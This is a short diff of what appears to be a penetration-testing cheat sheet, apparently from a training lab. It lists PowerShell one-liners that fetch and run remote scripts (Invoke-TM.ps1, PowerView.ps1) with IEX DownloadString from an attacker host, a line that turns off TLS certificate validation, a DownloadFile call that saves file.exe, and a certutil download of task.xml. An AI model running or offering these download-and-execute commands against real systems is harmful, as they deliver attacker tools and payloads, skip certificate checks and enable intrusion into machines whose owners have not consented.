@@ -13,7 +13,9 @@ functions:
         IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.149/Invoke-TM.ps1'))
         IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.149:8000/PowerView.ps1'))
 		
-		Ignore Cert Trusts - [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadString('https://192.168.119.149:8000/Invoke-TM.ps1')"
+		Ignore Cert Trusts - [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+		
+		(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.149/file.exe', 'here.exe')
 
         +++++++++certutil+++++++++
         certutil.exe -urlcache -f http://192.168.119.149:8000/task.xml task.xml
